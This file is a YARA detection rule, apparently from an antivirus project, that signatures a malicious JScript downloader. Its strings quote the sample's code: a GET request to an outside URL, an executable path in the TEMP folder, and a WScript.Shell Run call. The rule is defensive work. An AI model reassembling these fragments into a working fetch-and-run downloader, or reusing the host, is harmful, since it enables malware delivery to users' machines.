rule sig_20160329_fa1f2c76eb277a2fc94026f34dd26beb {
  meta:
    description = "datamaliciousorder - file 20160329_fa1f2c76eb277a2fc94026f34dd26beb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9584e4e3a355e47458c489c7b3daaf9dfddffc3a48877cca87500e870585939b"

  strings:
    $s1  = "U0[b](\"GET\", \"http://caferacerpneus.com.br/lw2osd\", false);" fullword ascii
    $s2  = "function G() {return s[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"CXJIVuexMN9Rczmk.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[d](K() * 11); if (U0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function O(v1, aG){P = P * 1; return v1 - aG;};" fullword ascii
    $s5  = "var s = function o() {return WScript[h](\"WScript.Shell\");}(), z = 11;" fullword ascii
    $s6  = "function re(){return \"\" + j;};" fullword ascii
    $s7  = "function yA() {return ((Lb == true) && (Lb == GL)) ? 1 : P;};" fullword ascii
    $s8  = "function xr(P0){s[\"Run\"](P0, P, P);};" fullword ascii
    $s9  = "function K(){return 22;};" fullword ascii
    $s10 = "function qM(Bq) {var vq = (1, 2, 3, 4, 5, Bq); return vq;};" fullword ascii
    $s11 = " while (lJ){" fullword ascii
    $s12 = "var yW = new this[\"Date\"]();" fullword ascii
    $s13 = "return O(lJ0, VH);" fullword ascii
    $s14 = "function gq(){return h;};" fullword ascii
    $s15 = "var Lb = false;" fullword ascii
    $s16 = "GL = true; " fullword ascii
    $s17 = "Lb = true; " fullword ascii
    $s18 = "var GL = false;" fullword ascii
    $s19 = "} catch(v0){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}